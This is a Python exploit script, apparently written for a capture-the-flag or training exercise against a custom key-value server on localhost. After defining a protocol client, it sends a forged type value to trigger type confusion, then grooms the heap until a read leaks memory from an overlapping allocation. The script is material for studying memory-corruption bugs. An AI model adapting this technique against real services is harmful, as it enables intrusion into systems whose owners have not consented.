import socket
import struct
import subprocess
import os, sys

def p32(v): return struct.pack('<I', v)
def p64(v): return struct.pack('<Q', v)
def p64f(v): return struct.pack('<d', v)
def u32(v): return struct.unpack('<I', v)[0]
def u64(v): return struct.unpack('<Q', v)[0]
def u64f(v): return struct.unpack('<d', v)[0]

class Client(object):
    REQUEST_PUT, REQUEST_GET, REQUEST_QUIT = 0x1001, 0x1002, 0x1003
    TYPE_NONE = 0x2001
    TYPE_INTEGER, TYPE_FLOAT, TYPE_BLOB = 0x2002, 0x2003, 0x2004
    RESPONSE_OK = 0x3001
    RESPONSE_ERR_INVALID_REQUEST = 0x3002
    RESPONSE_ERR_INVALID_VALUE = 0x3003
    RESPONSE_ERR_INVALID_ID = 0x3004

    def __init__(self, host='localhost', port=9011):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))

    def send(self, data):
        self.sock.send(data)

    def recv(self, size):
        dat = b''
        while size:
            blk = self.sock.recv(size)
            dat += blk
            size -= len(blk)
        return dat

    def put(self, index, value):
        """Send PUT request
        """
        self.send(p32(self.REQUEST_PUT))
        self.send(p32(index))

        if value is None:
            self.send(p32(self.TYPE_NONE))

        elif isinstance(value, int):
            self.send(p32(self.TYPE_INTEGER))
            self.send(p64(value))

        elif isinstance(value, float):
            self.send(p32(self.TYPE_FLOAT))
            self.send(p64f(value))

        elif isinstance(value, bytes):
            self.send(p32(self.TYPE_BLOB))
            self.send(p32(len(value)))
            self.send(value)

        else:
            raise ValueError("Value must be none, int, float, or bytes.")

        stat = u32(self.recv(4))
        if stat != self.RESPONSE_OK:
            print(f"[-] PUT ResponseStatus: {stat}")

    def get(self, index, size=None):
        """Send GET request
        """
        self.send(p32(self.REQUEST_GET))
        self.send(p32(index))

        stat = u32(self.recv(4))
        if stat != self.RESPONSE_OK:
            print(f"[-] GET ResponseStatus: {stat}")
            return None

        ty = u32(self.recv(4))
        if ty == self.TYPE_NONE:
            return None

        elif ty == self.TYPE_INTEGER:
            return u64(self.recv(8))

        elif ty == self.TYPE_FLOAT:
            return u64f(self.recv(8))

        elif ty == self.TYPE_BLOB:
            self.send(p32(size))
            return self.recv(size)

        else:
            raise ValueError(f"Invalid type returned from server: {ty}")

    def __del__(self):
        self.send(p32(self.REQUEST_QUIT))
        self.send(p32(0))
        stat = u32(self.recv(4))
        if stat != self.RESPONSE_OK:
            print(f"[-] QUIT ResponseStatus: {stat}")
        self.sock.close()


if __name__ == '__main__':
    c = Client(host='localhost', port=9021)
    c.put(0, b"A" * 0x28)
    c.send(p32(c.REQUEST_PUT))
    c.send(p32(0)) # index
    c.send(p32(0xdeadbeef)) # 不正な型情報
    assert u32(c.recv(4)) == c.RESPONSE_OK

    while True:
        c.put(1, b"test") # 破壊対象のValue [1]
        leak = c.get(0, 0x28)
        if u64(leak[0:8]) == 0x2004:
            # [1]のValueがデータと同じアドレスにある場合
            # Blobのtype情報(0x2004)があるはず
            break
        c.put(1, None)

    input("> ")
    c.get(0, 0x28)
